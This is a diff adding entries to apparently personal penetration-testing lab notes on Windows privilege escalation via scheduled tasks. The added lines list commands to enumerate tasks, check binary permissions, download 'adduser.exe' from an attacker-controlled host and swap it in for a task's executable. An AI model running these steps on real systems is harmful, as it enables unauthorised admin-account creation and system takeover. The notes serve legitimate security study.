@@ -2218,6 +2218,23 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     net localgroup administrators
     ```
 - 17.3.1 Scheduled Tasks
+  - Exploit task "CacheCleanup"  
+    ```
+    schtasks /query /fo LIST /v
+    icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+
+    iwr -Uri http://192.168.45.221/adduser.exe -Outfile BackendCacheCleanup.exe
+    move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
+    move .\BackendCacheCleanup.exe .\Pictures\
+    ```
+  - Enumerate scheduled tasks  
+    ```
+    schtasks /query /fo LIST /v
+    
+    iwr -Uri http://192.168.45.221/adduser.exe -Outfile VoiceActivation.exe
+    move .\Searches\VoiceActivation.exe VoiceActivation.exe.bak
+    move .\VoiceActivation.exe .\Searches\
+    ```
 - 17.3.2 Using Exploits
 - dsdd  
 
